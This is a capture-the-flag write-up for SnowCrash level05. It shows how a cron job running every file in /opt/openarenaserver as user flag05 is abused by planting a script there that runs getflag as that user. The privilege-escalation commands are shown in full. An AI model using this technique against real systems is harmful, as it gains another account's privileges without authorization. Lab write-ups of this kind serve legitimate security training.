```sh
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
```sh
level05@SnowCrash:~$ file /usr/sbin/openarenaserver
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Looked for any crontab but was unable to read flag05 cron files.

'You have new mail.' Message made me look for a mail service
```sh
level05@SnowCrash:~$ ls /var/mail
level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Now I know that the openarenaserver script is run every two minutes I need to take advantage

```sh
echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag
while [ ! -f /tmp/flag05 ]; do sleep 2; done;
cat /tmp/flag05
```
